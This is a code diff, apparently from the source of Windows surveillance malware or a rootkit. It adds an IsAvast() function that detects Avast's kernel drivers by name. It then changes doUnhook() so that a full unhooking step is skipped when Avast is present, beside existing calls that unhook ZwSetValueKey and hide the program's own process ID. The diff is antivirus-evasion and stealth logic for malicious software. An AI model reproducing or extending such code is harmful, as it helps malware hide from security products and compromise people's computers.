@@ -490,6 +490,13 @@ BOOL IsFSecure()
 	return TRUE;
 }
 
+BOOL IsAvast()
+{
+	if (IsDriverRunning(L"aswSP.sys") || IsDriverRunning(L"aswFsBlk.sys"))
+		return TRUE;
+
+	return FALSE;
+}
 
 BOOL IsKaspersky()
 {
@@ -612,7 +619,8 @@ BOOL doUnhook()
 	// fa tutto ciò che serve
 	if (IsVista(&dummy))
 		dev_unhook.unhook_getadmin();
-	dev_unhook.unhook_all(FALSE);
+	if (!IsAvast())
+		dev_unhook.unhook_all(FALSE);
 	dev_unhook.unhook_func("ZwSetValueKey", TRUE);
 	dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
 
@@ -632,7 +640,8 @@ BOOL doUnhook()
 		if (!dev_unhook.unhook_isdrv(DRIVER_NAME_W))
 			return FALSE;
 
-		dev_unhook.unhook_all(FALSE);
+		if (!IsAvast())
+			dev_unhook.unhook_all(FALSE);
 		dev_unhook.unhook_func("ZwSetValueKey", TRUE);
 		dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
 	}
